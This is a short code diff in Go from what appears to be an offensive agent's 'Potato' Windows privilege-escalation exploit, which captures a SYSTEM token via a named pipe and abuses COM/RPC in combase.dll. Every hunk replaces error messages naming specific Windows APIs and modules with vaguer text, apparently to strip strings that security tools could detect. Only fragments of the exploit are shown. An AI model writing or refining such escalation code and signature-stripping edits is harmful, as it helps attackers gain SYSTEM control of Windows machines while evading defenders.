@@ -192,7 +192,7 @@ func potatoCaptureSystemToken(ps *potatoPipeSet, phase *int32) (*potatoCaptureRe
 			procDisconnectNamedPipe.Call(hPipe)
 
 			if err != nil {
-				return nil, fmt.Errorf("connected as %s but DuplicateTokenEx: %v", clientIdentity, err)
+				return nil, fmt.Errorf("connected as %s but token duplication failed: %v", clientIdentity, err)
 			}
 
 			result.token = dupToken
@@ -225,11 +225,11 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 
 	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
 	if err != nil {
-		return errorf("Failed to find combase.dll: %v", err)
+		return errorf("Failed to find target COM module: %v", err)
 	}
 	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
 	if err != nil {
-		return errorf("Failed to find ORCB RPC interface in combase.dll: %v", err)
+		return errorf("Failed to find RPC interface in target module: %v", err)
 	}
 
 	atomic.StoreInt32(phase, 2)
@@ -316,7 +316,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	select {
 	case triggerErr = <-triggerDone:
 	case <-time.After(5 * time.Second):
-		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
+		triggerErr = fmt.Errorf("COM interface unmarshal blocked for >5s")
 	}
 
 	capture, captureErr := potatoCaptureSystemToken(pipes, phase)
